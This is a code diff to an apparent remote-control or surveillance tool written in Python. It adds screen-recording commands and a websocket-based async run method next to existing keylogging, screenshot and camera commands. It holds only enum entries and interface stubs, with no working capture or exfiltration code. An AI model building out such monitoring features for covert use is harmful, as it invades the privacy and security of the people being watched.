@@ -1,7 +1,7 @@
 from abc import ABC, abstractmethod
 from enum import Enum
 from pydantic import BaseModel
-
+import websockets
 
 
 class Command(Enum):
@@ -44,6 +44,8 @@ class Command(Enum):
     START_KEYLOG = "START_KEYLOG"
     STOP_KEYLOG = "STOP_KEYLOG"
     EXPORT_KEYLOG_TEXT = "EXPORT_KEYLOG_TEXT"
+    START_SCREEN_RECORDING = "START_SCREEN_RECORDING"
+    STOP_SCREEN_RECORDING = "STOP_SCREEN_RECORDING"
 
     GET_AVAILABLE_DEVICES = "GET_AVAILABLE_DEVICES"
     START_CAMERA = "START_CAMERA"
@@ -164,6 +166,8 @@ command_to_module_map = {
     # Surveillance Commands
     
     Command.SCREENSHOT: "visuals",
+    Command.START_SCREEN_RECORDING: "visuals",
+    Command.STOP_SCREEN_RECORDING: "visuals",
     Command.GET_AVAILABLE_DEVICES: "surveillance",
     Command.START_CAMERA: "surveillance",
     Command.START_KEYLOG: "keylog",
@@ -261,6 +265,8 @@ class CommandResult(BaseModel):
     success: bool
 
 class ICommandModule(ABC):
-    @abstractmethod
     def run(self, command: Command, args: CommandArgs) -> CommandResult | None:
+        pass
+
+    async def ws_run(self, command: Command, args: CommandArgs, ws: websockets.WebSocketClientProtocol) -> None:
         pass
